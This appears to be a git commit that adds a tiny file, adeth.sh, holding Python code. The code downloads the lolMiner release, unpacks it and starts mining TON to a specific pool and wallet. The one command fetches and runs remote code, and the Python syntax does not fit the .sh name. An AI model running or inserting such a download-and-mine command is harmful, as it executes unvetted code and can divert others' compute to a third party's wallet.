cc907e995a2f4517853818002628db73b4b4d6af
fardethhh <107308719+fardethhh@users.noreply.github.com>
2022-06-11 17:02:01 +0000

    Create adeth.sh

---
+++ adeth.sh
@@ -0,0 +1,2 @@
+import os
+os.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz && tar zxvf lolMiner_v1.48_Lin64.tar.gz && cd 1.48 && ./lolMiner --algo TON --pool https://next.ton-pool.com --user EQAU65D93HKNayy41oi6nRz1uoQMUfje1KErUCTXNZq8eAOR")
